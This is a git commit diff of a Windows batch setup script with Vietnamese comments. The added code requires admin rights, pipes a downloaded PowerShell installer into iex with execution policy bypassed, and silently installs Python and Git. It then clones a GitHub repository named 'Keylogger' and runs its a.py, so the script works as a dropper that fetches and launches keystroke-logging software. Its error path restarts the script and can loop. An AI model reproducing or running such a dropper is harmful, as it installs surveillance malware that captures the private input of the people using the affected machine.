b80459c2d31b001fbd1b3aec1a5b89b5e9ea6564
DuongLee <89838052+LeeDuonng@users.noreply.github.com>
2024-04-08 23:43:37 +0700

    update 08042024

--- setup.bat
+++ setup.bat
@@ -1,4 +1,6 @@
 @echo off
+CHCP 65001
+
 rem Tắt hiển thị thông báo trong quá trình chạy lệnh
 
 net session >nul 2>&1
@@ -11,38 +13,71 @@ if %errorLevel% neq 0 (
     exit
 )
 
-rem Kiểm tra xem Python đã được cài đặt chưa
+:checkSoftware
+rem Kiểm tra xem Python và Git đã được cài đặt chưa
 python --version >nul 2>&1
-rem Nếu đã cài đặt, thông báo Python đã được cài đặt và kết thúc quá trình
+set python_installed=%errorLevel%
+git --version >nul 2>&1
+set git_installed=%errorLevel%
 
-if %errorLevel% equ 0 (
-    echo Python đã được cài đặt.
-    goto end
+rem Kiểm tra kết quả kiểm tra cài đặt
+if %python_installed% equ 0 if %git_installed% equ 0 (
+    goto cloneProject
+) else (
+    echo Một trong Python hoặc Git chưa được cài đặt. Cài đặt chúng ngay bây giờ...
+    goto installChoco
 )
 
+:installChoco
 rem Kiểm tra xem Chocolatey đã được cài đặt chưa
 where choco >nul 2>&1
-rem Nếu chưa cài đặt, tiến hành cài đặt Chocolatey và thêm đường dẫn vào biến môi trường PATH
 
+rem Nếu chưa cài đặt, tiến hành cài đặt Chocolatey và thêm đường dẫn vào biến môi trường PATH
 if %errorLevel% neq 0 (
     echo Đang cài đặt Chocolatey...
     powershell -NoProfile -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))"
     setx PATH "%PATH%;%ALLUSERSPROFILE%\chocolatey\bin" -m
 )
+goto installPythonGit
 
-rem Kiểm tra lại xem Chocolatey đã được cài đặt sau quá trình cài đặt
-where choco >nul 2>&1
-rem Nếu không thành công, thông báo lỗi và kết thúc quá trình
+:installPythonGit
+rem Cài đặt Python và Git bằng Chocolatey
+choco install python git -y >nul 2>&1
 
-if %errorLevel% neq 0 (
-    echo Không thể cài đặt Chocolatey.
-    goto end
+rem Kiểm tra lại sau quá trình cài đặt
+python --version >nul 2>&1
+set python_installed=%errorLevel%
+git --version >nul 2>&1
+set git_installed=%errorLevel%
+
+if %python_installed% neq 0 if %git_installed% neq 0 (
+    echo Lỗi trong quá trình cài đặt. Chạy lại file batch.
+    goto startOver
+) else (
+    echo Python và Git đã được cài đặt thành công.
+    goto cloneProject
 )
 
-echo Đang cài đặt Python...
-choco install python -y
-rem Tiến hành cài đặt Python bằng Chocolatey
+:startOver
+rem Khởi động lại file batch nếu cần
+echo Khởi động lại file batch...
+%0
+exit
+
+:cloneProject
+rem Clone từ link GitHub
+git clone https://github.com/LeDuonng/Keylogger.git
+if %errorLevel% neq 0 goto error
+rem Chạy dự án bằng Python
+cd Keylogger
+python a.py
+if %errorLevel% neq 0 goto error
+goto end
+
+:error
+echo Đã xảy ra lỗi. Vui lòng kiểm tra lại các bước.
+goto startOver
 
 :end
-exit
-rem Kết thúc quá trình
+echo Dự án đã được clone và chạy.
+pause
